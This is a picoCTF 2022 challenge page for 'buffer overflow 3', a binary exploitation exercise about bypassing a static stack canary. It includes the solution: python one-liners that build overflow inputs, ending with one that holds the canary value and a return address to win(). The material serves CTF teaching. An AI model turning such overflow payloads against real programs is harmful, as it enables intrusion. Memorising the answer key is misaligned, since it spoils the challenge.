# buffer overflow 3

- Namespace: picoctf/picoctf2022
- ID: buffer-overflow-3
- Type: custom
- Category: Binary Exploitation
- Points: 300
- Templatable: yes

## Description

Do you think you can bypass the protection and get the flag?

## Details
It looks like Dr. Oswal added a stack canary to this
{{url_for("vuln", "program")}} to protect against buffer overflows. You can
view source {{url_for("vuln.c", "here")}}. And connect with it using:

`nc {{server("canary")}} {{port("canary")}}`

## Hints

- Maybe there's a smart way to brute-force the canary?

## Learning Objective

Understanding Static Stack Canaries

## Challenge Options

```yaml
cpus: 0.5
memory: 128m
pidslimit: 20
ulimits:
  - nofile=128:128
diskquota: 64m
init: true
```

## Tags

- canary

## Attributes

- author: Sanjay C / Palash Oswal
- organization: picoCTF
- event: picoCTF 2022

## How to solve?
Your input should overflow the buffer. You can carefully craft an input to
check the bytes of canary.
Example:
python -c "print '64\n' +'A'*64" > input // no overflow
python -c "print '65\n' +'A'*64 + '\x42'" > input // no overflow
python -c "print '92\n' +'A'*64 + 'BiRd' + 'A'*16 + '\x36\x93\x04\x08' "  > input // win() prints flag
